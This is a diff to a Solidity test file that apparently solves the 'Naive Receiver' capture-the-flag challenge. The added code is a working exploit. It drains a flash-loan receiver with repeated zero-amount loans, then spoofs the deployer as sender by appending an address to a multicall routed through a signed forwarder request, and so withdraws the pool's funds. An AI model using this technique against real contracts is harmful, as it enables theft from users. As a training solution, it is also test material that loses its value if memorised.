@@ -3,6 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
+import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
@@ -77,7 +78,33 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory calls = new bytes[](11);
+
+        for (uint256 i = 0; i < 10; ++i) {
+            calls[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, bytes("")));
+        }
+
+        calls[10] = abi.encodePacked(
+            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes20(deployer)
+        );
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1_000_000,
+            nonce: 0,
+            data: abi.encodeCall(pool.multicall, (calls)),
+            deadline: block.timestamp + 1 days
+        });
+
+        bytes32 digest =
+            MessageHashUtils.toTypedDataHash(forwarder.domainSeparator(), forwarder.getDataHash(request));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
     }
 
     /**
